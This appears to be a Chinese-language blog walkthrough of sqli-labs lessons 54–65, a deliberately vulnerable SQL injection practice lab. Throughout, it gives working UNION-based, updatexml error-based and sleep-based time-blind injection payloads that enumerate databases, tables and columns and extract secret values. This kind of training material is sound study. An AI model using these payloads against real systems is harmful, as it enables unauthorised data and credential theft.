
# Sqli-labs-Less-54
![](https://img-blog.csdnimg.cn/20200728085406284.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=NSCR1&originHeight=481&originWidth=1113&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**从这一关开始就接近真实的环境<br />在这一关中对输入的次数做了限制，必须在10次以内获取到数据，否则就会刷新数据。**

**判断注入点**<br />http://www.web.com/sql/Less-54/?id=1'<br />错误，没有错误回显<br />![](https://img-blog.csdnimg.cn/2020072808584188.png#crop=0&crop=0&crop=1&crop=1&id=FWU6n&originHeight=115&originWidth=430&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**进行注释，成功说明存在注入点**<br />http://www.web.com/sql/Less-54/?id=1'--+<br />![](https://img-blog.csdnimg.cn/20200728085919126.png#crop=0&crop=0&crop=1&crop=1&id=aW03c&originHeight=187&originWidth=302&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看列数**<br />http://www.web.com/sql/Less-54/?id=1' order by 3--+<br />为4是返回错误，为3时返回正确，说明为3列<br />![](https://img-blog.csdnimg.cn/20200728090008179.png#crop=0&crop=0&crop=1&crop=1&id=KA7i5&originHeight=169&originWidth=289&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查询当前库和所有数据库**<br />http://www.web.com/sql/Less-54/?id=-1' union select 1,database(),group_concat(schema_name) from information_schema.schemata--+<br />![](https://img-blog.csdnimg.cn/20200728090334882.png#crop=0&crop=0&crop=1&crop=1&id=wlApS&originHeight=85&originWidth=831&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查询所有表（challenges）**<br />http://www.web.com/sql/Less-54/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'--+<br />![](https://img-blog.csdnimg.cn/20200728090534396.png#crop=0&crop=0&crop=1&crop=1&id=PjIzV&originHeight=68&originWidth=266&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查询表中字段**<br />http://www.web.com/sql/Less-54/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='bv18m6rwxy'--+<br />![](https://img-blog.csdnimg.cn/20200728090637815.png#crop=0&crop=0&crop=1&crop=1&id=QIGSY&originHeight=80&originWidth=371&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查询账户和密码**<br />http://www.web.com/sql/Less-54/?id=-1' union select 1,2,group_concat(concat_ws('~',sessid,secret_Y0YL)) from challenges.bv18m6rwxy--+<br />![](https://img-blog.csdnimg.cn/20200728091003909.png#crop=0&crop=0&crop=1&crop=1&id=AL4FN&originHeight=115&originWidth=679&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
将得到的密码输入到下面的方框中进行验证<br />![](https://img-blog.csdnimg.cn/20200728091057613.png#crop=0&crop=0&crop=1&crop=1&id=vAezT&originHeight=50&originWidth=432&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
登录，显示成功<br />![](https://img-blog.csdnimg.cn/20200728091239155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=wBW3W&originHeight=205&originWidth=934&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


# Sqli-labs-Less-55
![](https://img-blog.csdnimg.cn/20200728091640570.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=mTNe1&originHeight=377&originWidth=1118&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

本关对输入次数的限制为14次

**查找注入点**<br />http://www.web.com/sql/Less-55/?id=1'<br />错误<br />**进行注释还是错误，更改为"也不对**<br />http://www.web.com/sql/Less-55/?id=1)--+<br />**成功**<br />![](https://img-blog.csdnimg.cn/20200728092126180.png#crop=0&crop=0&crop=1&crop=1&id=Igmdo&originHeight=137&originWidth=351&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断列数**<br />http://www.web.com/sql/Less-55/?id=1) order by 3--+<br />为4是返回错误，为3时返回正确，说明为3列<br />![](https://img-blog.csdnimg.cn/20200728092220224.png#crop=0&crop=0&crop=1&crop=1&id=GqYWn&originHeight=185&originWidth=305&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查询当前数据库和所有数据库**<br />http://www.web.com/sql/Less-55/?id=-1) union select 1,database(),group_concat(schema_name) from information_schema.schemata--+<br />![](https://img-blog.csdnimg.cn/20200728092341474.png#crop=0&crop=0&crop=1&crop=1&id=rg1G0&originHeight=97&originWidth=843&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查询所有表**<br />http://www.web.com/sql/Less-55/?id=-1) union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema='challenges'--+<br />![](https://img-blog.csdnimg.cn/20200728092445106.png#crop=0&crop=0&crop=1&crop=1&id=Hzzut&originHeight=185&originWidth=310&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查询字段**<br />http://www.web.com/sql/Less-55/?id=-1) union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='jvvcry5xdu'--+<br />![](https://img-blog.csdnimg.cn/20200728092603586.png#crop=0&crop=0&crop=1&crop=1&id=tXNd9&originHeight=170&originWidth=349&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查询账户和密码**<br />http://www.web.com/sql/Less-55/?id=-1) union select 1,database(),group_concat(concat_ws('~',sessid,secret_SMO0)) from challenges.jvvcry5xdu--+<br />![](https://img-blog.csdnimg.cn/20200728092819666.png#crop=0&crop=0&crop=1&crop=1&id=t4IyC&originHeight=184&originWidth=669&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**将得到的密码输入到下面的方框中进行验证**<br />![](https://img-blog.csdnimg.cn/20200728092846463.png#crop=0&crop=0&crop=1&crop=1&id=srAo8&originHeight=44&originWidth=419&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**成功**<br />![](https://img-blog.csdnimg.cn/20200728092859621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=gLK0j&originHeight=230&originWidth=785&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


# Sqli-labs-Less-56
![](https://img-blog.csdnimg.cn/2020072809304782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=Qv9RM&originHeight=483&originWidth=1124&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**本关对输入次数的限制为14次**

**查找注入点**<br />尝试了5次，找到注入点<br />http://www.web.com/sql/Less-56/?id=1')--+<br />![](https://img-blog.csdnimg.cn/20200728093454245.png#crop=0&crop=0&crop=1&crop=1&id=fcerU&originHeight=190&originWidth=319&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看当前库和所有数据库**<br />http://www.web.com/sql/Less-56/?id=-1') union select 1,database(),group_concat(schema_name) from information_schema.schemata--+<br />![](https://img-blog.csdnimg.cn/20200728093703764.png#crop=0&crop=0&crop=1&crop=1&id=qhWt0&originHeight=80&originWidth=826&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有表**<br />http://www.web.com/sql/Less-56/?id=-1') union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema='challenges'--+<br />![](https://img-blog.csdnimg.cn/20200728093818819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=wx7Zy&originHeight=201&originWidth=307&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看字段**<br />http://www.web.com/sql/Less-56/?id=-1') union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='v35mb8m56l'--+<br />![](https://img-blog.csdnimg.cn/20200728093924515.png#crop=0&crop=0&crop=1&crop=1&id=p5XT3&originHeight=184&originWidth=369&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看账户和密码**<br />http://www.web.com/sql/Less-56/?id=-1') union select 1,database(),group_concat(concat_ws('~',sessid,secret_PG94)) from challenges.v35mb8m56l--+<br />![](https://img-blog.csdnimg.cn/20200728094103500.png#crop=0&crop=0&crop=1&crop=1&id=ndS3p&originHeight=86&originWidth=685&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**将得到的密码输入到下面的方框中进行验证**<br />![](https://img-blog.csdnimg.cn/20200728094129141.png#crop=0&crop=0&crop=1&crop=1&id=UzwgM&originHeight=40&originWidth=401&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**成功**<br />![](https://img-blog.csdnimg.cn/20200728094143160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=HhocB&originHeight=248&originWidth=794&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


# Sqli-labs-Less-57
![](https://img-blog.csdnimg.cn/20200728094444432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=GBwu1&originHeight=464&originWidth=1104&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
本关对输入次数的限制为14次

**查找注入点，花费了两次机会**<br />http://www.web.com/sql/Less-57/?id=1"--+<br />![](https://img-blog.csdnimg.cn/20200728094642873.png#crop=0&crop=0&crop=1&crop=1&id=mh6j6&originHeight=153&originWidth=305&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看当前库和所有数据库**<br />http://www.web.com/sql/Less-57/?id=-1" union select 1,database(),group_concat(schema_name) from information_schema.schemata--+<br />![](https://img-blog.csdnimg.cn/20200728094803137.png#crop=0&crop=0&crop=1&crop=1&id=FssAC&originHeight=78&originWidth=836&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有表**<br />http://www.web.com/sql/Less-57/?id=-1" union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema='challenges'--+<br />![](https://img-blog.csdnimg.cn/20200728094900497.png#crop=0&crop=0&crop=1&crop=1&id=ofHNz&originHeight=174&originWidth=281&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看所有字段**<br />http://www.web.com/sql/Less-57/?id=-1" union select 1,database(),group_concat(column_name) from information_schema.columns where table_name='84p3km1zad'--+<br />![](https://img-blog.csdnimg.cn/20200728095008595.png#crop=0&crop=0&crop=1&crop=1&id=ZHs7o&originHeight=178&originWidth=335&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看账户和密码**<br />http://www.web.com/sql/Less-57/?id=-1" union select 1,database(),group_concat(concat_ws('~',sessid,secret_0N9A)) from challenges.84p3km1zad--+<br />![](https://img-blog.csdnimg.cn/20200728095347105.png#crop=0&crop=0&crop=1&crop=1&id=VgVod&originHeight=87&originWidth=691&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**将得到的密码输入到下面的方框中进行验证**<br />![](https://img-blog.csdnimg.cn/20200728095406147.png#crop=0&crop=0&crop=1&crop=1&id=iKNeQ&originHeight=71&originWidth=404&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**成功**<br />![](https://img-blog.csdnimg.cn/20200728095419146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=qTHPg&originHeight=217&originWidth=773&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


# Sqli-labs-Less-58
![](https://img-blog.csdnimg.cn/20200728095929768.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=RIF8S&originHeight=474&originWidth=1143&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

本关对输入次数的限制为5次

**查找注入点（一次试对）**<br />http://www.web.com/sql/Less-58/?id=1'--+<br />![](https://img-blog.csdnimg.cn/2020072810020115.png#crop=0&crop=0&crop=1&crop=1&id=rVlSs&originHeight=194&originWidth=323&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看当前库和所有数据库**<br />http://www.web.com/sql/Less-58/?id=-1' union select 1,database(),group_concat(schema_name) from information_schema.schemata--+<br />![](https://img-blog.csdnimg.cn/20200728100520200.png#crop=0&crop=0&crop=1&crop=1&id=hi8Pe&originHeight=181&originWidth=267&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
并没有任何反应，尝试使用报错注入

**查看当前数据库**<br />http://www.web.com/sql/Less-58/?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+<br />![](https://img-blog.csdnimg.cn/20200728100704302.png#crop=0&crop=0&crop=1&crop=1&id=CsfxF&originHeight=153&originWidth=305&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
再次我已经使用了五次，干脆再错一次重置一下数据

**查看当前数据库**<br />http://www.web.com/sql/Less-58/?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+<br />![](https://img-blog.csdnimg.cn/2020072810081389.png#crop=0&crop=0&crop=1&crop=1&id=XDtOa&originHeight=162&originWidth=295&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
数据库并没有发生改变

**查看所有表**<br />http://www.web.com/sql/Less-58/?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1)--+<br />![](https://img-blog.csdnimg.cn/20200728102937690.png#crop=0&crop=0&crop=1&crop=1&id=hx85O&originHeight=63&originWidth=314&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看字段**<br />http://www.web.com/sql/Less-58/?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='1crgm7zd79'),0x7e),1)--+<br />![](https://img-blog.csdnimg.cn/20200728103012151.png#crop=0&crop=0&crop=1&crop=1&id=hGW4h&originHeight=76&originWidth=415&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看密码**<br />http://www.web.com/sql/Less-58/?id=1' and updatexml(1,concat(0x7e,(select group_concat(secret_BLS3) from challenges.1crgm7zd79),0x7e),1)--+<br />![](https://img-blog.csdnimg.cn/20200728103255765.png#crop=0&crop=0&crop=1&crop=1&id=sWZNJ&originHeight=72&originWidth=495&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**将得到的密码输入到下面的方框中进行验证**<br />![](https://img-blog.csdnimg.cn/20200728103330711.png#crop=0&crop=0&crop=1&crop=1&id=uqBVI&originHeight=47&originWidth=390&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**成功**<br />![](https://img-blog.csdnimg.cn/20200728103341381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=GQcDG&originHeight=233&originWidth=749&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


# Sqli-labs-Less-60

![](https://img-blog.csdnimg.cn/20200728105744107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=gtQ2h&originHeight=471&originWidth=1099&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
本关对输入次数的限制为5次，不做过多解释，直接使用报错注入<br />**判断注入点**<br />[_http://www.web.com/sql/Less-60/?id=1_](http://www.web.com/sql/Less-60/?id=1)_"_<br />报错，并显示我们少了一个)，存在注入<br />![](https://img-blog.csdnimg.cn/20200728110131870.png#crop=0&crop=0&crop=1&crop=1&id=W3azf&originHeight=37&originWidth=1240&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看数据库**<br />[_http://www.web.com/sql/Less-60/?id=1_](http://www.web.com/sql/Less-60/?id=1)_") and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+_<br />![](https://img-blog.csdnimg.cn/2020072811022722.png#crop=0&crop=0&crop=1&crop=1&id=nj8Bc&originHeight=151&originWidth=298&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**查看表**<br />[_http://www.web.com/sql/Less-60/?id=1_](http://www.web.com/sql/Less-60/?id=1)_") and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1)--+_<br />![](https://img-blog.csdnimg.cn/20200728110538268.png#crop=0&crop=0&crop=1&crop=1&id=b6d6e&originHeight=164&originWidth=293&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看字段**<br />[_http://www.web.com/sql/Less-60/?id=1_](http://www.web.com/sql/Less-60/?id=1)_") and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='5uur039ahk'),0x7e),1)--+_<br />![](https://img-blog.csdnimg.cn/20200728110626370.png#crop=0&crop=0&crop=1&crop=1&id=qC2RS&originHeight=162&originWidth=389&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看密码**<br />[_http://www.web.com/sql/Less-60/?id=1_](http://www.web.com/sql/Less-60/?id=1)_") and updatexml(1,concat(0x7e,(select group_concat(secret_GRR2) from challenges.5uur039ahk),0x7e),1)--+_<br />![](https://img-blog.csdnimg.cn/20200728110707895.png#crop=0&crop=0&crop=1&crop=1&id=Uk7jj&originHeight=168&originWidth=456&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**将得到的密码输入到下面的方框中进行验证**<br />![](https://img-blog.csdnimg.cn/20200728110722236.png#crop=0&crop=0&crop=1&crop=1&id=Apk3Q&originHeight=42&originWidth=428&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**成功**<br />![](https://img-blog.csdnimg.cn/20200728110737708.png#crop=0&crop=0&crop=1&crop=1&id=G6LDI&originHeight=199&originWidth=789&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


# Sqli-labs-Less-61
![](https://img-blog.csdnimg.cn/20200728111634624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=jFgqv&originHeight=488&originWidth=1117&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
本关对输入次数的限制为5次，不做过多解释，直接使用报错注入

**查找注入点**<br />http://www.web.com/sql/Less-61/?id=1'<br />报错，并显示我们少了))，存在注入点<br />![](https://img-blog.csdnimg.cn/20200728111931885.png#crop=0&crop=0&crop=1&crop=1&id=x10gl&originHeight=37&originWidth=1269&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看数据库**<br />http://www.web.com/sql/Less-61/?id=1')) and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+<br />![](https://img-blog.csdnimg.cn/20200728112034403.png#crop=0&crop=0&crop=1&crop=1&id=Ajohu&originHeight=153&originWidth=284&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看表**<br />http://www.web.com/sql/Less-61/?id=1')) and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges'),0x7e),1)--+<br />![](https://img-blog.csdnimg.cn/20200728112206423.png#crop=0&crop=0&crop=1&crop=1&id=NoxEf&originHeight=157&originWidth=325&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看字段**<br />http://www.web.com/sql/Less-61/?id=1')) and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='ct68iwp1c5'),0x7e),1)--+<br />![](https://img-blog.csdnimg.cn/20200728112246715.png#crop=0&crop=0&crop=1&crop=1&id=JybVr&originHeight=182&originWidth=426&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**查看密码**<br />http://www.web.com/sql/Less-61/?id=1')) and updatexml(1,concat(0x7e,(select group_concat(secret_ROXS) from challenges.ct68iwp1c5),0x7e),1)--+<br />![](https://img-blog.csdnimg.cn/20200728112329126.png#crop=0&crop=0&crop=1&crop=1&id=IMhFL&originHeight=182&originWidth=521&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**将得到的密码输入到下面的方框中进行验证**<br />![](https://img-blog.csdnimg.cn/20200728112341205.png#crop=0&crop=0&crop=1&crop=1&id=t65yT&originHeight=49&originWidth=413&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**成功**<br />![](https://img-blog.csdnimg.cn/20200728112349402.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=qnMnX&originHeight=215&originWidth=778&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)


# Sqli-labs-Less-62
![](https://img-blog.csdnimg.cn/20200728142310424.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=Mabfa&originHeight=491&originWidth=1116&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**本关对输入次数的限制为130次，通过次数可知，这一关是需要使用万恶的时间盲注**

**查找注入点**<br />http://www.web.com/sql/Less-62/?id=1' and sleep(2)--+

**存在注入则延时2s，没有延时**<br />http://www.web.com/sql/Less-62/?id=1') and sleep(2)--+<br />有延时，存在注入<br />![](https://img-blog.csdnimg.cn/2020072814450664.png#crop=0&crop=0&crop=1&crop=1&id=Mzht2&originHeight=140&originWidth=354&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断数据库名称长度**<br />http://www.web.com/sql/Less-62/?id=1') and if(length(database())=10,1,sleep(2))--+<br />当等于9或者11时都有延时，说明数据库名称长度为10<br />![](https://img-blog.csdnimg.cn/20200728144710324.png#crop=0&crop=0&crop=1&crop=1&id=xwrRl&originHeight=171&originWidth=301&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断数据库名称**<br />http://www.web.com/sql/Less-62/?id=1') and if(substr((select database()),1,1)='c',1,sleep(2))--+<br />当猜测正确时页面会立即刷新并返回正确，猜测错误则延时2s并返回错误<br />使用burp爆破可以找出数据库为challenges<br />![](https://img-blog.csdnimg.cn/20200728145933878.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=JGStv&originHeight=292&originWidth=823&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**此处使用时间注入所需要的的时间太长，不进行一一描叙**<br />时间注入详见Sqli-labs-Less-8


# Sqli-labs-Less-63
![](https://img-blog.csdnimg.cn/2020072815054946.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=GlKYJ&originHeight=504&originWidth=1127&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**本关对输入次数的限制为130次，通过次数可知，这一关是需要使用万恶的时间盲注**

**查找注入点**<br />http://www.web.com/sql/Less-63/?id=1' and sleep(2)--+<br />存在注入则延时2s，有延时，存在注入<br />![](https://img-blog.csdnimg.cn/20200728150851724.png#crop=0&crop=0&crop=1&crop=1&id=FKo8I&originHeight=113&originWidth=340&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断数据库名称长度**<br />http://www.web.com/sql/Less-63/?id=1' and if(length(database())=10,1,sleep(2))--+<br />当等于9或者11时都有延时，说明数据库名称长度为10<br />![](https://img-blog.csdnimg.cn/20200728151103261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=cxu2O&originHeight=201&originWidth=361&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**此处使用时间注入所需要的的时间太长，不进行一一描叙**<br />时间注入详见Sqli-labs-Less-8


# Sqli-labs-Less-64
![](https://img-blog.csdnimg.cn/20200728151336226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=xycLS&originHeight=487&originWidth=1099&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**本关对输入次数的限制为130次，通过次数可知，这一关是需要使用万恶的时间盲注**

**查找注入点**<br />http://www.web.com/sql/Less-64/?id=1)) and sleep(2)--+<br />存在注入则延时2s，有延时，存在注入<br />![](https://img-blog.csdnimg.cn/20200728151628913.png#crop=0&crop=0&crop=1&crop=1&id=VavCc&originHeight=130&originWidth=342&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断数据库名称长度**<br />http://www.web.com/sql/Less-64/?id=1)) and if(length(database())=10,1,sleep(2))--+<br />当等于9或者11时都有延时，说明数据库名称长度为10<br />![](https://img-blog.csdnimg.cn/20200728151701993.png#crop=0&crop=0&crop=1&crop=1&id=Nva3T&originHeight=194&originWidth=363&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**此处使用时间注入所需要的的时间太长，不进行一一描叙**<br />时间注入详见Sqli-labs-Less-8


# Sqli-labs-Less-65
![](https://img-blog.csdnimg.cn/20200728151859286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=asWMp&originHeight=501&originWidth=1119&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
**本关对输入次数的限制为130次，通过次数可知，这一关是需要使用万恶的时间盲注**

**查找注入点**<br />http://www.web.com/sql/Less-65/?id=1") and sleep(2)--+<br />存在注入则延时2s，有延时，存在注入<br />![](https://img-blog.csdnimg.cn/20200728152145434.png#crop=0&crop=0&crop=1&crop=1&id=eDe7x&originHeight=112&originWidth=337&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**判断数据库名称长度**<br />http://www.web.com/sql/Less-65/?id=1") and if(length(database())=10,1,sleep(2))--+<br />当等于9或者11时都有延时，说明数据库名称长度为10<br />![](https://img-blog.csdnimg.cn/20200728152412252.png#crop=0&crop=0&crop=1&crop=1&id=ps9fK&originHeight=186&originWidth=330&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

**此处使用时间注入所需要的的时间太长，不进行一一描叙**<br />**时间注入详见Sqli-labs-Less-8**















